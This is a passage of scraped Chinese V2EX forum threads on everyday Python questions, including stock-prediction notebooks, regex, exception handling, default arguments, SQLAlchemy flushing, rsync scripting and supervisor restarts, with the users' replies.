Series(Y1.values,new_index)\nY5 = Y5.pct_change()\nY5 = Y5[1:]\nY5.head()\n\n</code></pre>\n<pre><code>#转换到 0 、 1\nf = lambda x: 1 if x &gt; 0 else -1\nY5 = Y5.apply(f)\nY5.head()\n\n</code></pre>\n<pre><code>Y5 = Y5.shift(-1,freq='1d')\nY5.head()\n\n</code></pre>\n<pre><code>new_index2 = pd.to_datetime(OOS_pricing_data.index)\nX11 = DataFrame(OOS_pricing_data.values,new_index2)\nX11.head()\n\n</code></pre>\n<pre><code>X11 = X11[:-1]\nX11.index\n\n</code></pre>\n<pre><code>Y5.index\n\n</code></pre>\n<pre><code>X11 = imputer.fit_transform(X11)\nX11 = scaler.fit_transform(X11)\nOOS_predictions = NN.predict(X11)\n\n</code></pre>\n<pre><code>check_accuracy(OOS_predictions, OOS_Y)\n\n</code></pre>\n<p>result: 0.5034013605442177</p>\n<p>50%</p>\n<p>只有 50%的准确率</p>\n<p>可能是在不同时期之间的不稳定造成的，这导致学习神经网络,很适合现在的条件训练数据,但不适合在不同条件下测试数据。也有可能是神经网络是适合噪声而没有体现出真正的信号，很难讲。</p>\n<pre><code>new_index3 = pd.to_datetime(data.index)\nY6 = pd.DataFrame(data.values,new_index3)\nY6.columns = ['601668','601800','601390','601186','601618','601669']\nY6.head()\n\n</code></pre>\n<pre><code>corr_df = pd.rolling_corr(Y6 , window=30)\ncorr_df\n\n</code></pre>\n<p>看看平稳性</p>\n<pre><code>fig = plt.figure(figsize=(16,8.5))\nplt.plot(corr_df[:,'601668','601669'])\nplt.plot(corr_df[:,'601800','601669'])\nplt.plot(corr_df[:,'601390','601669'])\nplt.plot(corr_df[:,'601186','601669'])\nplt.plot(corr_df[:,'601618','601669'])\nts = corr_df[:, '601618','601669']\nplt.hlines(ts.mean(), ts.index[30-1], ts.index[-1], linestyles='dashed')\nplt.ylabel('Pearson Correlation Coefficient')\nplt.legend(['601668 x 601669', '601800 x 601669', '601390 x 601669', '601186 x 601669', '601618 x 601669','601618 x 601669 AVG'])\n\n</code></pre>\n<pre><code>adfuller(data['601668'])\n\n</code></pre>\n<pre><code>adfuller(data['601800'])\n\n</code></pre>\n<pre><code>adfuller(data['601390'])\n\n</code></pre>\n<pre><code>adfuller(data['601186'])\n\n</code></pre>\n<pre><code>adfuller(data['601618'])\n\n</code></pre>\n<pre><code>adfuller(data['601669'])\n\n</code></pre>\n<p>源地址： <a href=\"https://uqer.io/community/share/587db6aa23a7d6004da3665b\" rel=\"nofollow\">https://uqer.io/community/share/587db6aa23a7d6004da3665b</a></p>\n</div></div>"], "reply": "8", "tittle": "Python 机器学习 - 拟合具有非平稳特征的神经网络对股票进行预测", "comment": ["收藏先", "笑尿。\r", "“只有 50%的准确率”\r", "这意味着这个神经网络和抛硬币没有太大的区别", "A 股受政策影响很大，要么千股齐涨，要么千股起跌。所以这个场景，人工智能并不适合预测。更多人选择做美股的量化交易。\r", "不过，我觉得机器学习在 A 股自有 A 股的利用方法。等我做完了发现无效的话，再把代码发出来。", "我见过最奇葩的言论是这个 ", "\r", "\r", "不知这哥们成功没。非要说学习“新闻联播”，不是不可以（语义分析?），但政策出台的具体时间根本无法预测。而政策的出现，已经等价于一个结果，而不是预测因素。", " ", "这兄弟 又来安利了", "人工神经网络不是万金油。", "学习新闻联播...笑了..."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>除了[\\s\\S]外，还有其它办法能匹配“跨行”的内容吗？问题比较烂，我用个简单例子来说明下：</p>\n<p>如下这段 HTML ，我要匹配出 Text 的内容，因为中间还插着很多其它内容，所以我不能简单的<code>&lt;p&gt;(.*?)&lt;\\/p&gt;</code>做匹配，必需从某个父节点找下去，才能精确定义，从父节点下去就涉及到“跨行”了</p>\n<pre><code>&lt;p class=\"anchor\"&gt;\n\n&lt;a href=\"＃\"&gt;Link&lt;/a&gt;\n\n&lt;img src=\"/img/cover.jpg\"&gt;&lt;p&gt;Text&lt;/p&gt;\n</code></pre>\n<p>我目前知道的办法是，但听说这样效率不好，内容多了容易“卡”住，因为[\\s\\S]，除此之外还有其它办法达到我期望的效果吗？感谢🙏</p>\n<pre><code>anchor\"&gt;[\\s\\S]+.*?p&gt;(.*?)&lt;\\/p&gt;\n</code></pre>\n</div></div>"], "reply": "8", "tittle": "Python 正则匹配跨行 HTML 的办法", "comment": ["re.search(\"<p.*p>\", text, re.S)", "用 lxml 之类的库，尽量不要用正则\r", "多行匹配加参数 re.DOTALL", "跨行一般是用 re.S 的", "谢谢三位， re.S 果然可行。\r", "\r", " 嗯，我知道有几个 HTML 解析的库可用，我直接写正则会不会效率更高一些呢？", "我觉得用 lxml 配合 XPath 好一点，可读性和可维护性要比直接正则好一点", "用 xml parser 会更好一点，因为 html 本身不是正则的语言", "运行效率 regex 高，开发效率 dom 高", "HTML 不是正则语言\r", "如果你担心 DOM 的效率有问题，可以用 SAX"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>突然有个想法，如果有下面代码：</p>\n<pre><code>try:\n    容易出错的函数()\n    后续()                 #这个函数必须等前面函数，不出错才能执行\ncatch Exception e:\n    pass\n</code></pre>\n<p>你们会把后续函数放在哪里？ try-catch 里面还是外面？</p>\n</div></div>", "<div class=\"topic_content\">感谢各位，明白了</div>"], "reply": "21", "tittle": "话说 try catch 执行效率低吗？不限于 Python", "comment": ["当然是里面了 try 的意义不就是这样吗", "如果后续需要依赖会出错的函数,那应该在里面\r", "如果后续不依赖,出错了也要执行就放外面", "python 的话，我喜欢放 else 里面", "红帽有偏文章，说是像 if xxx==True 这样的语句可以用 try catch 来写尽量用 try catch ，说是更 pythonic", "尽量用 try except 。(针对 Python\r", "●Throwing exceptions is not “ expensive ” in Python unlike e.g. Java.\r", "● Rely on duck typing rather than checking for a specific type.", "throw/catch (except/catch) 更能表达这个操作的本质， try 只是个定界符。", "try 不冷处理所有的异常，不代表 try 了这一块就不会崩溃。\r", "都知道容易出错了，就把容易出错的说一下处理，类型检查，越界，线程安全等等", "看错了  我说的是 Objc", "低。。\r", "\r", "\r", "C 语言里的 if 效率都低。\r", "\r", "\r", "\r", "JavaScript 里， tryc 似乎比 if 快很多", "这个。。。刚需而且没有对比，低不低没有意义", "js 里尽量少用 try catch    因为 v8 引擎不会对 trycatch 进行优化", "1. 大部分情况下，不 throw 的 try 块基本不会有什么损失\r", "2. 如 @", " 所说 V8 有这问题，这属于 V8 太烂- -\r", "3. try/catch 是业务控制，大部分时候容不得你用还是不用，我不建议为了所谓性能去把应该用异常的场合变成 return code 之类的方式\r", "4. 但这并不代表鼓励你大块大块使用 try/catch ，需要的场合应该都只是一小块的关键代码\r", "5. 对于 V8 这种场景，如果想减小 try/catch 对优化的影响，把 try/catch 放进一个独立函数中即可", "1. Python 的 try catch 性能损失很小\r", "2. Python 社区一般会推荐使用 try-catch 风格的异常检查, 因为\r", "    2.1 try-catch 的代码往往比 检查 return code 更精简\r", "    2.2 检查 return code 可能会造成 race condition.\r", "3. 你样例里的 后续() 不应该放在 try-catch 里。 一般 try-catch 里的代码应该尽量少， 但这和性能无关。\r", "因为你的本意是捕捉 容易出错的函数() 里的异常， 而这段代码实际上做的是 捕捉 容易出错的函数() 和 后续() 的异常， 而后续() 往往不能直接套用前面的异常处理逻辑", " +1 不喜欢太长。\r", "前面的异常捕获后直接 return 或继续抛异常。", "try: ... catch ... else: ...", " 你这样欺负解释器语言………\r", "谁知道解释器自己用掉多少嘛………", ".... . easier ask forgiveness than get permission ，所以写就好了", "Python 的 try..catch 有个蛋疼的问题是, 搞一下这个, 就要往右缩进 4 个字符, 有时逻辑复杂已经缩进了好多实在是不想因为这个再缩进了.\r", "另外 try catch 包围起来的代码块里代码尽可能少, 尽量只放你要保护的代码, 其他的无关代码全拿到外面.", " 你说的这个是 try catch 的锅吗？ python 中 if else 也有这个头疼的问题", " 你说是缩进吗? 这也不是锅啦. 我有强迫症, 看着代码格式不好看就想给它弄漂亮一点."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>代码如下：</p>\n<pre><code>def fun(l=None):\n    if l is None:\n        l = []\n    l.append('append content')\n    return l\n</code></pre>\n<p>这里当执行 <code>l = []</code> 是不是就代表 l 已经指向了 一个空 list 了，　那不是同样会出现默认参数的记忆效果？</p>\n<p>我想这里很有可能是我对 python 内存分配的原理不懂，　烦请大家帮我解释下，　谢谢大家啦！！</p>\n</div></div>"], "reply": "4", "tittle": "关于 Python 的默认参数，有一个疑惑，请教大家！[python3]", "comment": ["当然不会记忆啊，你试试这个 ", "a=[] ", "b=[] ", "a.append(1) ", "这个时候 b 是[1]吗？", "Python 语言设计的一个规定，参数的默认值是对象而非一个表达式，不会每次重新执行，所以你在默认参数写 l=[] 才会导致 mutable 。\r", "\r", "C++ 的规定正好相反，参数的默认值是一个表达式而非一个对象，每次调用都会重新执行这个表达式。", "因为函数在 python 中也是一个对象，比如你举例的 fun 函数， func.__defaults__这个属性记录了函数的默认值 tuple ，你这个例子里面，这个 tuple 是(None, )。 假如你默认值指定了一个可变对象，比如空列表。 那么这个 tuple 里面存的值会是([], )。 这样就会导致你在代码中改变这个默认参数的时候（比如往这个列表中加了个元素 10 ），会影响 func.__defaults__相应的值---变成了（[10], ）。 \r", "\r", "所以要避免这种情况，函数的默认参数最好指定为不可变的对象。\r", "\r", "你在函数体中进行 l = [], 等于将 l 这个变量名绑定了新的[], 这样对 func.__defaults__不会产生任何影响。"]},
{"content": ["<div class=\"topic_content\">目前Python3支持的越来越好，想搞一搞试试Python3了。</div>"], "reply": "12", "tittle": "你们现在有没有计划把 Python2 的项目转移到 Python3？", "comment": ["搞吧", "很多年没用 Python 2 了", "难道不是新项目上 py3 ？大部分用 py2 的还是由于历史遗留原因吧，", "[谁来给我讲清楚: Python2 和 3 到底有毛区别]( ", ")", "绝不会没事找事", "动态语言做项目迁移前应该先搞 type annotation 啊\r", "\r", " 收好", "新项目上 py3 ，老项目继续在 py2 ，然后慢慢淘汰老项目", "我司服务器还用的 centos6.2 ， python2.6....", "还没有， py2 再战三年无压力", "> 新项目上 py3 ，老项目继续在 py2 ，然后慢慢淘汰老项目\r", "\r", "+1", "> 新项目上 py3 ，老项目继续在 py2 ，然后慢慢淘汰老项目 \r", "\r", "+1", " 总感觉还是有些低估了。。。上次 python2.7->python3.5 ， deepin 的 apt-get 直接挂掉。查了好半天才查出是这个问题"]},
{"content": "", "reply": "2", "tittle": "fabric 是不是不能获得程序回显，所以只能用 pxssh？如果想远程执行获得回显还有优雅方案吗？", "comment": ["fabric 可以吧.", "是可以的~ 百度和谷歌差了太多了。。\r", "\r", "结贴"]},
{"content": ["<div class=\"topic_content\">['4065529837148919'] \r<br>9f128f33jw1e8qgp5bmzyj2050050aa8.jpg \r<br>lxhxixi_org.gif \r<br>2Flxhxixi_org.gif \r<br>9f128f33ly1fbw8sp2ro7j20qo1beq4l.jpg \r<br>Exception in thread Thread-51: \r<br>Traceback (most recent call last): \r<br>File \"/usr/lib/python3/dist-packages/urllib3/connection.py\", line 137, in _new_conn \r<br>(self.host, self.port), self.timeout, **extra_kw) \r<br>File \"/usr/lib/python3/dist-packages/urllib3/util/connection.py\", line 67, in create_connection \r<br>for res in socket.getaddrinfo(host, port, 0, socket.SOCK_STREAM): \r<br>File \"/usr/lib/python3.5/socket.py\", line 732, in getaddrinfo \r<br>for res in _socket.getaddrinfo(host, port, family, type, proto, flags): \r<br>socket.gaierror: [Errno -3] Temporary failure in name resolution \r<br>\r<br>During handling of the above exception, another exception occurred: \r<br>\r<br>Traceback (most recent call last): \r<br>File \"/usr/lib/python3/dist-packages/urllib3/connectionpool.py\", line 559, in urlopen \r<br>body=body, headers=headers) \r<br>File \"/usr/lib/python3/dist-packages/urllib3/connectionpool.py\", line 353, in _make_request \r<br>conn.request(method, url, **httplib_request_kw) \r<br>File \"/usr/lib/python3.5/http/client.py\", line 1106, in request \r<br>self._send_request(method, url, body, headers) \r<br>File \"/usr/lib/python3.5/http/client.py\", line 1151, in _send_request \r<br>self.endheaders(body) \r<br>File \"/usr/lib/python3.5/http/client.py\", line 1102, in endheaders \r<br>self._send_output(message_body) \r<br>File \"/usr/lib/python3.5/http/client.py\", line 934, in _send_output \r<br>self.send(msg) \r<br>File \"/usr/lib/python3.5/http/client.py\", line 877, in send \r<br>self.connect() \r<br>File \"/usr/lib/python3/dist-packages/urllib3/connection.py\", line 162, in connect \r<br>conn = self._new_conn() \r<br>File \"/usr/lib/python3/dist-packages/urllib3/connection.py\", line 146, in _new_conn \r<br>self, \"Failed to establish a new connection: %s\" % e) \r<br>requests.packages.urllib3.exceptions.NewConnecti onError: &lt;requests.packages.urllib3.connection.HTTPConnection object at 0x7f6d60069b00&gt;: Failed to establish a new connection: [Errno -3] Temporary failure in name resolution \r<br>\r<br>During handling of the above exception, another exception occurred: \r<br>\r<br>Traceback (most recent call last): \r<br>File \"/usr/lib/python3/dist-packages/requests/adapters.py\", line 376, in send \r<br>timeout=timeout</div>"], "reply": "1", "tittle": "图片爬虫报错，这个是什么原因", "comment": ["DNS 解析失败。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Google <a href=\"https://www.google.com/foobar\" rel=\"nofollow\">foo.bar</a>游戏，本地测试正常，在游戏上提交了几次都测试失败了，代码如下，请大家帮我看看。</p>\n<pre><code>def answer(x, y):\n\t# your code here\n\ta=0\n\twhile True:\n\t\tif a==len(x):\n\t\t\ta=0\n\t\t\twhile True:\n\t\t\t\tif y[a] in x:\n\t\t\t\t\ta=a+1\n\t\t\t\telse:\n\t\t\t\t\tprint(y[a])\n\t\t\t\t\treturn\n\t\telif x[a] in y:\n\t\t\ta=a+1\n\t\telse:\n\t\t\tprint(x[a])\n\t\t\treturn\n</code></pre>\n<p>#只有一个两个列表中一个不含另一个的值，输出的是一个值</p>\n</div></div>"], "reply": "8", "tittle": "Python 列出两个列表中一个不含另一个的值", "comment": ["这种东西在线问被查到会很惨的", " 隐藏本帖比较好\r", "一方面这种彩蛋招聘还要作弊就没意思了\r", "其实被 Google 索引到的话对楼主不利", "可以用 set", "```python\r", "def answer(x,y):\r", "\ta = [e for e in x if e not in y]\r", "\tb = [e for e in y if e not in x]\r", "\tprint(a+b)\r", "\r", "```", " 我没打算用这种方式进 Google ，我只是纳闷本地测试没问题而提交就不行了\r", "\r", " 仍然本地测试没问题而提交就不行了\r", "\r", "纳闷。。。。", "一般就是一些边界条件没搞对 有些 testcase 过不了 你自己再查查吧", "可能的点：\r", "1. 缺少对输入值的检查，例如传入的参数是乱七八糟的其他东西\r", "2. 性能（速度、内存等）不达标", "或许是 return 问题，这样写 return 是 None 。"]},
{"content": ["<div class=\"topic_content\">打包“ hello world ”也一样，都报错 Indexerror ： tuple index out of range ？，请问是什么问题？谢谢</div>"], "reply": "5", "tittle": "win7 下 python3.6 使用 py2exe 或 pyinstaller 都报 Indexerror： tuple index out of range", "comment": ["因为： python 3.6 is not supported yet\r", "\r", "以上原文来自 pyinstaller 的 github issue 页面", " 我真是太笨了,谢谢你哈", "3.6 装个 numpy 都报错， 我已经换回 3.5 了", "感觉 3.6 又是 py3 的分水岭了？（大雾", "3.6 经常出各种问题，报的错也不明确，换回 3.5 吧"]},
{"content": ["<div class=\"topic_content\">我的爬虫在工作的时候是从表里取地址，然后再获取数据，为了在某个地址出错以后重新执行时还从这里开始，我用另一个表来记录当前地址的 ID ，这样，下回直接从这里执行就可以了。\r<br>我现在想把记录 ID 的这个步骤放到 sqlite 的内存数据库中，这样可以减轻硬盘的压力，可是如果在出错以后，内存数据库也就清空了，那么怎样能在出错时把当前内存数据库的记录保存下来呢？</div>"], "reply": "8", "tittle": "在出错时如何保存 sqlite 内存数据库中的记录？", "comment": ["你多大的数据库啊，硬盘吃不消吗？", "只是解决你这个问题：\r", "\r", "使用普通模式，但是数据库保存在 ramdisk 。", "降低读写次数的话，可以每隔一分钟或 N 条后保存即可，仅仅丢失一部分，我感觉应该可以接受。\r", "如果是提高读写效率，可以见楼上 ramdisk 。", "呃，虽然不是很了解楼主的需求，但是为什么不用 try..except? 在 except 里把出错的地址写会数据库里？", "不要加表，加一 bool 字段\r", "你现在这样插入行开销很大\r", "bool 原本有，只是改值开销小", "另外，你这个需求本质上是个队列，用队列库实现就好办了", " 你说的 ramdisk 就是指的 sqlite 里的 sqlite3.connect(':memory:')这种模式吗？", " 你这是内存模式，我说的 ramdisk 你不知道？\r", "看这里：\r", "\r", "\r", "下次请自己查吧……\r", "\r", "你也不说你什么系统，不好提供方案。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"\" src=\"https://ww4.sinaimg.cn/large/006tNc79gy1fbwwehl2n1j31kw0ucn7e.jpg\"></p>\n<p><a href=\"https://foobar.withgoogle.com/\" rel=\"nofollow\">https://foobar.withgoogle.com/</a></p>\n<p>还是第一次触发，惭愧了</p>\n</div></div>"], "reply": "37", "tittle": "在 Google 搜索 Python 我看到了这个", "comment": ["天选之人", "我发现我登录不进去...", "知乎上有专栏有介绍，作者说他因此参加了 Google 的面试。昨晚看到的。", "我可能用了假 google", "python 没有 try catch ，只有 try except", "楼主你用的是啥搜索结果屏蔽插件？我快被 Google 搜索到的各种垃圾站烦死了", "我也遇到过，还过了几关，哈哈", " 应该是 personal-blocklist\r", "厉害了", "禁用了*.google.com js  cookie 的路过", " 好的，我先试试", "  \r", " ", " ", "我没有碰到", "是 google ncr", "这个可以人工进的\r", "原来就是个图灵传的附属品，第一关之后会有限时编程题目，并不难", "网页打不开呀。", " 得是.com  .com.hk 等都不行", "玩到了第二关 之后再接着玩= =", "妈蛋为啥我从来没见过，看来搜索的少了", "怎么才能触发?", "随机触发吗", "登录失败 23333\r", "为何搜 js 就遇不到 23333333333333", "我可能用了假谷歌，没任何反应-_-||", "我记得以前搜索 python pass by reference/value 也会触发的", "可能用了假浏览器", "我也碰到过~", "Requesting challenge...\r", "Max active challenge count reached.", "我可能用了假谷歌", "有点意思，回车后等一下就触发了 不行的话就再回车一下", "我碰到 做到第四关不想做了 给面试几率很低的 网上又有答案", "妈蛋我一天到晚搜，从来没出过……\r", "我可能遇到了假 google", "wtf ……吐槽完又搜一次就有了？？？？", "\r", "触发过才能登陆", "我肯定是用了假的 Google", "我也遇到过，刷到 Level 3 可以选是否有兴趣被 recruited ，会有谷人希的 recruiter 找你要 resume 。"]},
{"content": ["<div class=\"topic_content\">windows 上用 pycharm 编程，最后还是要放到 centos 去运行~</div>"], "reply": "15", "tittle": "帮忙推荐一个 windows 好用的 Python rsync 模块~谢谢", "comment": ["你意思是把代码都 push 到 centos 里去吗...\r", "我都是 lrzsz....", " 我这边是服务端，主要是对其他多个 rsync 下的目录文件进行监控，主机是 windows ，服务端是 centos 。\r", "\r", "在 windows 上面编码脚本，没发现好用的 rsync 模块，后来用了个 windows 下的 rsync.exe ，\r", "\r", "还是用的 os.popen()方式解决的问题，部分代码如下\r", "\r", "    RSYNC = 'E:/xxxx/cwRsync_5.5.0_x86_Free/bin/rsync.exe '\r", "    host = '10.3.5.70'\r", "\r", "    dd = os.popen(RSYNC+host+\"::\"+\"logs\")", " 我很少在 win 上折腾。。\r", "\r", "你可以看看这个", "Pycharm 的 Deployment 不是支持 ssh,ftp 同步的吗?", " 这个我看了的，他是 python 环境下可以直接利用这个脚本进行 rsync 的交互，这边自己调用系统命令基本完成好了。\r", "\r", " 我这里不是同步数据，主要是对 rsync 的数据进行监控，查看增量，然后通过一定的逻辑，去动态拉取这个数据。", "渣渣代码分享下\r", "[code]#!/usr/bin/env python\r", "# coding=utf-8\r", "# author=Tonybreak\r", "\r", "import os\r", "import platform\r", "import time\r", "\r", "WIN_RSYNC = 'E:/xxxx/cwRsync_5.5.0_x86_Free/bin/rsync.exe'\r", "LINUX_RSYNC = '/usr/bin/rsync'\r", "HOST = '10.3.5.70'\r", "MOD_NAME = 'logs'\r", "\r", "\r", "def i_system():\r", "    return platform.system()\r", "\r", "def choose_rsync():\r", "\r", "    if i_system() == \"Windows\":\r", "        rsync = WIN_RSYNC\r", "    elif i_system() == \"Linux\":\r", "        rsync = LINUX_RSYNC\r", "    else:\r", "        rsync = \"Maybe something is wrong.\"\r", "\r", "    return rsync\r", "\r", "def rsync_cmd():\r", "\r", "    target = []\r", "    rsync = choose_rsync()\r", "    cmds = '%s %s::%s' %(rsync,HOST,MOD_NAME)\r", "    dd = os.popen(cmds)\r", "\r", "    for d in dd:\r", "        target.append(d.strip().split(' '))\r", "\r", "    for i in target:\r", "        d4 = int(i[-4].replace(',', ''))\r", "        t = str(i[-3] + ' ' + i[-2])\r", "        t1 = time.strptime(t, '%Y/%m/%d %H:%M:%S')\r", "        t3 = int(time.mktime(t1))\r", "        print i[-1], t3, d4\r", "\r", "\r", "def main():\r", "    rsync_cmd()\r", "\r", "\r", "if __name__ == '__main__':\r", "    main()\r", "[/code]", "不在 linux 下写，也请开个 linux 虚拟机吧……\r", "\r", "有时候不同 Linux 发行版的差异都会坑死人的。", " 我有 linux 的服务器，写完的代码直接同步过去运行测试了的。在 linux 的 vim 下写代码，真心难受。还是算了吧", "不习惯 Vim ，试试 Emacs 吧 ", " ", " \r", "\r", "首先,linux 下压根不用 vim 写程序。我用 visualcode,挺好。\r", "\r", "其次，为什么跑 linux 虚拟机一定要在 linux 里编辑，你在 mount 个本地文件夹，在 windows 下编辑不就好了", " \r", " \r", "\r", "好的，我来试试~主要是 windows 上面办公（手动 doge 脸）", "不如用 btsync", "1. paramiko\r", "2. sshpass -p passwd ssh|scp", "因为内存很大，我开了 linux 虚拟机开 pycharm.再 rsync", "FileZilla + sftp"]},
{"content": ["<div class=\"topic_content\">python 中 id([1]) == id([2]) 为 True,这是为啥啊</div>"], "reply": "7", "tittle": "有个疑惑", "comment": ["性能优化，内部把 list 重用了吧。", "id([1]) is id([2])", " tuple 为啥不会出现这种情况", "tuple 是 immutable 的，没法重用", " id(()) == id(())返回的为 True", "  list 是临时对象，内存会自动清理， tuple 不会，而且 ()和(1)存放地址区域不同", "id(object)\r", "\r", "Return the “ identity ” of an object. This is an integer (or long integer) which is guaranteed to be unique and constant for this object during its lifetime. **Two objects with non-overlapping lifetimes may have the same id() value.**\r", "\r", "```\r", ">>> id([1])\r", "4391579520\r", ">>> id([2])\r", "4391579520\r", ">>> a = [1]\r", ">>> b = [1]\r", ">>> id([1])\r", "4391757944\r", ">>> id([2])\r", "4391757944\r", ">>> id(a)\r", "4391579520\r", ">>> id(b)\r", "4391641672\r", ">>> id([])\r", "4391757944\r", "```"]},
{"content": ["<div class=\"topic_content\">创建了一个 object, 以及把其加入到 session 里后, 查询 id 都是空, 但是执行了一次 query 之后 id 就有值了.\r<br>\r<br>感觉这么处理很怪, 一个 query 语句居然会背地里对数据库做修改. 不太理解为什么要这样设计. 我觉得把修改数据库的动作放到session.add()里不是更好? query我默认就是不对数据库做修改的啊.\r<br>\r<br>\r<br>----------\r<br>解释一下下面的输出: User是一个类, 代表一张表, session是我创建的Session类的对象. \r<br>1. 创建一行数据(User的实例)\r<br>2. 调用session.add()加入到session\r<br>3. 查询: session.query(...).all()\r<br>\r<br>------------------------\r<br>&gt;&gt;&gt; user7 = User(name='test', fullname='test_full', password='nopwd')\r<br>&gt;&gt;&gt; user7.id\r<br>&gt;&gt;&gt; session.add(user7)\r<br>&gt;&gt;&gt; user7.id\r<br>&gt;&gt;&gt; session.query(User).all()\r<br>2017-01-20 16:37:00,557 INFO sqlalchemy.engine.base.Engine INSERT INTO users (name, fullname, password) VALUES (?, ?, ?)\r<br>2017-01-20 16:37:00,557 INFO sqlalchemy.engine.base.Engine ('test', 'test_full', 'nopwd')\r<br>2017-01-20 16:37:00,557 INFO sqlalchemy.engine.base.Engine SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password\r<br>FROM users\r<br>2017-01-20 16:37:00,558 INFO sqlalchemy.engine.base.Engine ()\r<br>[...deleted...]\r<br>&gt;&gt;&gt; user7.id\r<br>8\r<br>&gt;&gt;&gt;</div>", "<div class=\"topic_content\">很多人是没 get 到我的点, 还是觉得用的人多的库, 设计上就是十全十美无可指摘?\r<br>大家觉得一个查询操作背后可以修改数据库, 这样的动作还合理的话, 可以看看这个帖子, 楼主在做类似的事情: <a target=\"_blank\" href=\"https://www.v2ex.com/t/336226?p=1\" rel=\"nofollow\">https://www.v2ex.com/t/336226?p=1</a>\r<br>\r<br>无论如何, 执行一个 query 操作, 这个动作就应该对数据库只读, 需要刷新的话, 可以挪到其他操作中去.</div>"], "reply": "8", "tittle": "SQLAlchemy 的 session.query(...).all()居然会把还没 commit 的对象 flush 到数据库?", "comment": ["首先，并没有提交到数据库，只 flush 了， flush 和 commit 不是一件事情。其次 session 创建的时候有个 auto_flush 参数表明 query 的时候是否 flush ，默认是 True, 多看看文档，才能更好的使用", "在 SQLAlchemy 中， add() 操作之后数据成为 pending 状态，此时数据不会立即写入到数据库中。  \r", "当你执行 query() 的时候，它会先把之前状态为 pending 的数据写入到数据库，并且更新当前 session 中存储的数据，然后再执行 query()  \r", "你可以看下文档的这个小节:\r", "[Adding and Updating Objects]( ", ")", "处理是合理的,只是不太智能,对同一个对象会生成多条更新语句.性能敏感时建议直接用 sql expression", "和 return 返回自动提交类似，也算是一种防止用户忘记 commit 的做法吧。\r", "\r", "默认主动帮用户提交、默认不主动帮用户提交，两个方案肯定是选前者。", " 是没有 commit, 毕竟后面还可以 rollback. 我的意思是确实执行了写操作, 否则那个 auto_increment 的 id 是拿不到的(这个必须数据库生成并返回, ORM 不能自作主张生成一个) 而这个放在 query 里做, 感觉不如放到前面 add 里.", " 又看了一下我的帖子, 可能是我的标题有些误导.", "正常行为，要不然你后面需要用这个 id 怎么办", "一般中间 query 的时候都会手动 flush,这是常识"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>from functools import partial\n\nret = None\n\nclass pipe:\n    def __init__(self, data):\n        self.data = data\n\n    def __or__(self, right):\n        if right is ret:\n            return self.data\n        elif isinstance(right, tuple):\n            return pipe(partial(*right)(self.data))\n        else:\n            return pipe(right(self.data))\n\n# with partial function\npipe(10) | range | partial(map, lambda x: x ** 2) | list | print\n# simplify partial function\npipe(10) | range | (map, lambda x: x ** 2) | list | print\n# assign return value to x\nx = pipe(10) | range | (map, lambda x: x ** 2) | list | ret\n</code></pre>\n<p>另外两个成果：</p>\n<p><a href=\"https://github.com/czheo/czheo.github.io/issues/9\" rel=\"nofollow\">https://github.com/czheo/czheo.github.io/issues/9</a></p>\n<p><a href=\"https://github.com/czheo/czheo.github.io/issues/10\" rel=\"nofollow\">https://github.com/czheo/czheo.github.io/issues/10</a></p>\n</div></div>"], "reply": "7", "tittle": "像写 shell 一样写 Python", "comment": ["想像写 python 一样写 shell 才是需求啊...", " Just for fun. 再来一个例子：\r", "···\r", "from itertools import groupby\r", "{k: list(v) for k, v in pipe([4,3,1,3,4,2,1,9]) | sorted | groupby | ret}\r", "## {1: [1, 1], 2: [2], 3: [3, 3], 4: [4, 4], 9: [9]}\r", "···", " shellpy", "重载 or 操作符 可以可以", " 赞同", " 你說的 shellpy 能改環境變量麼？", " 自己试试呗"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>本来按理来说\n当我调用 supervisorctl restart flower_admin:　的时候的日志是这个样子的\n2017-01-21 18:58:56,498 INFO stopped: wind-tasks-showoff (exit status 1)\n2017-01-21 18:59:46,495 INFO spawned: 'wind-tasks-showoff' with pid 26976\n2017-01-21 18:59:47,500 INFO success: wind-tasks-showoff entered RUNNING state, process has stayed up for &gt; than 1 seconds (startsecs)</p>\n<p>但是我发现我调用　 supervisorctl restart flower_admin:　\n日志是下面这样\n2017-01-21 18:43:13,882 INFO stopped: wind-tasks-showoff (exit status 1)\n然而，进程就卡在这里了？\n这是什么原因呢？</p>\n</div></div>"], "reply": "6", "tittle": "supervisorctl 重启进程重启不了", "comment": ["exit status 1 不是都告诉你异常退出了么?supervisorctl tail -f flower_admin 以下看下报错,还不行,直接手动启动下你的那个 flower_admin 应用看下", "  好的，我去看下", " ……。还是不明白错误怎么来的……没有找到对应的错误呀……", " 你能顺利用 supervisor 配置里面的启动命令启动么？", " 知道是什么问题。可能是 supervisor3.0b2 这个版本的原因。", "吓得我看了下我的 supervisor 版本"]},
{"content": ["<div class=\"topic_content\">假设有一个 descriptor 类:\r<br>class A(object) :\r<br>    def __set__(self, instance, value) :\r<br>        print 'set called'\r<br>另有一个类：\r<br>class B(object) :\r<br>    x=A()\r<br>    def __setattr__(self, name, value) :\r<br>        object.__setattr__(self, name, value) \r<br>        print self.name  \r<br>进行如下操作：\r<br>b=B()\r<br>b.x=6666\r<br>输出： set called \r<br>print self. name 出现错误（print语句在setattr中）\r<br>是为什么啊？各位分析一下，谢谢！</div>"], "reply": "目前尚无回", "tittle": "descriptor 类中的__set__和 owner 类中的__setattr__的调用顺序？", "comment": []},
